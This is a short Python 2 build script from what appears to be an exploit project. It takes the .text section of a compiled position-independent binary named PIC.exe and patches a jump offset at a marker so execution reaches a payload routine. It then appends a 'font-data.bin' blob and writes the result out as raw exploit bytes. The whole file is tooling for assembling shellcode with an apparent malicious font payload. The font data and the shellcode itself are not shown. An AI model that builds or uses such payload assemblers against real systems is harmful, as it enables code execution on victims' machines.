import os
import struct
import pefile

current_dir = os.getcwd()
pic_binary = os.path.join(current_dir, "exploit", "x64", "Release", "PIC.exe")
font_data = os.path.join("font-data.bin")

if os.path.isfile(font_data):
  with open(font_data, 'rb') as iFile:
    font = iFile.read()
  if os.path.isfile(pic_binary):
    pe = pefile.PE(pic_binary)
    for section in pe.sections:
      if ".text" in section.Name:
        text_section_size = section.Misc_VirtualSize

    if text_section_size:
      with open(pic_binary, 'rb') as iFile:
        data = iFile.read()

      text_section = data[0x400:0x400+text_section_size]
      ExecutePayload_index = text_section.rfind('\x48\x81\xEC')  # find 'sub rsp'
      offset_to_add = text_section_size - ExecutePayload_index
      marker_index = text_section.find('\x48\x05\xFE\xFE')       # find marker
      text_section = text_section[:marker_index+2] + struct.pack('<H', offset_to_add) + text_section[marker_index+4:]

      pic_bin = text_section + font

      with open('raw-bytes.bin', 'wb') as oFile:
        oFile.write(pic_bin)
    else:
      print "[!] Unable to find .text section."
  else:
    print "[!] Unable to find PIC.exe. Compile solution first or check the relative path in make-raw-bytes.py."
else:
  print "[!] Unable to find font-data.bin"
